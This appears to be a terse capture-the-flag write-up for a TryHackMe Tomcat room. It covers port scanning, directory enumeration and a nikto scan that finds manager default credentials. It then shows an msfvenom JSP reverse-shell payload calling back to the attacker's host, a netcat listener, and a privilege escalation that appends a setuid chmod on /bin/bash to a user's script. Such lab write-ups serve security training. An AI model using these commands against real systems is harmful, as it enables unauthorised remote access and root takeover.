```http
https://tryhackme.com/room/bsidesgtthompson
```

```ip
10.10.48.171
```
___
# Recon
## Nmap
```bash
sudo nmap -p- -sC -sV -T5 -Pn 10.10.48.171 -vv
```

```resoults
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
dirsearch -u http://10.10.48.171:8080/
```

```http
[13:28:10] 400 -    0B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[13:28:11] 400 -    0B  - /a%5c.aspx                                        
[13:28:32] 200 -    3KB - /build.xml                                        
[13:28:41] 302 -    0B  - /docs  ->  /docs/                                 
[13:28:41] 200 -   16KB - /docs/                                            
[13:28:44] 200 -    1KB - /examples/                                        
[13:28:44] 302 -    0B  - /examples  ->  /examples/                         
[13:28:44] 200 -    1KB - /examples/websocket/index.xhtml
[13:28:44] 200 -  658B  - /examples/servlets/servlet/CookieExample          
[13:28:44] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample   
[13:28:44] 200 -    6KB - /examples/servlets/index.html                     
[13:28:44] 200 -   14KB - /examples/jsp/index.html                          
[13:28:45] 200 -   21KB - /favicon.ico                                      
[13:28:45] 200 -  678B  - /examples/jsp/snp/snoop.jsp                       
[13:28:49] 302 -    0B  - /host-manager/  ->  /host-manager/html            
[13:28:49] 401 -    2KB - /host-manager/html                                
[13:28:58] 302 -    0B  - /manager  ->  /manager/                           
[13:28:58] 401 -    2KB - /manager/html                                     
[13:28:58] 401 -    2KB - /manager/jmxproxy                                 
[13:28:58] 401 -    2KB - /manager/html/                                    
[13:28:58] 401 -    2KB - /manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY
[13:28:58] 401 -    2KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage
[13:28:58] 401 -    2KB - /manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS
[13:28:58] 401 -    2KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=
[13:28:58] 401 -    2KB - /manager/jmxproxy/?qry=STUFF
[13:28:58] 401 -    2KB - /manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE
[13:28:58] 302 -    0B  - /manager/  ->  /manager/html
[13:28:58] 404 -    2KB - /manager/login.asp                                
[13:28:58] 404 -    2KB - /manager/admin.asp                                
[13:28:58] 401 -    2KB - /manager/status/all                               
[13:28:58] 404 -    2KB - /manager/VERSION                                  
[13:28:58] 404 -    1KB - /manager/login
```
## Enum ajp13 

> [!NOTE]
> 8009/tcp open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)

```http
https://book.hacktricks.wiki/en/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.html
```

```bash
nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 10.10.48.171 -T5
```
___

## Web
```bash
nikto -h http://10.10.48.171:8080/
```

```resoults
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /favicon.ico: identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104
+ /manager/html: Default account found for 'Tomcat Manager Application' at (ID 'tomcat', PW '*****'). Apache Tomcat. See: CWE-16
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected).
+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected).
+ /manager/status: Tomcat Server Status interface found (pass protected).
+ 8176 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2025-05-22 13:55:25 (GMT3) (995 seconds)
```

```http
http://10.10.48.171:8080/manager/html
```
___
# File Upload (RCE)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.0.211  LPORT=1337 -f raw > shell.jsp
```

```bash
jar -cvf shell.war *
```

```bash
nc -lnvp 1337
```
___
# LPE
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
echo "chmod u+s /bin/bash" >> /home/jack/id.sh
```

```bash
/bin/bash -p 
```
